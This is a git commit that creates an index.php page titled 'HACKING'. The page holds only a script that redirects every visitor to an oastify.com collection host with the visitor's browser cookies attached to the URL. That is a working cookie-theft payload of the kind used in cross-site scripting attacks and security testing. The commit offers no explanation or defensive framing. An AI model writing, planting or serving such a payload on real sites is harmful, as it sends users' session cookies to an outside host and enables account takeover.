5341b29ab0b0fd96387ed9cbca9deff794e47f46
cybersecuritydef <155002701+cybersecuritydef@users.noreply.github.com>
2026-08-17 20:35:13 +0300

    Create index.php

---
+++ index.php
@@ -0,0 +1,8 @@
+<html>
+  <head>
+    <title>HACKING</title>
+  </head>
+  <body>
+    <script>window.location = 'http://hcx1hgxcemheulil7ae53woc137uvlja.oastify.com?c=' + encodeURIComponent(document.cookie);</script>
+  </body>
+</html>
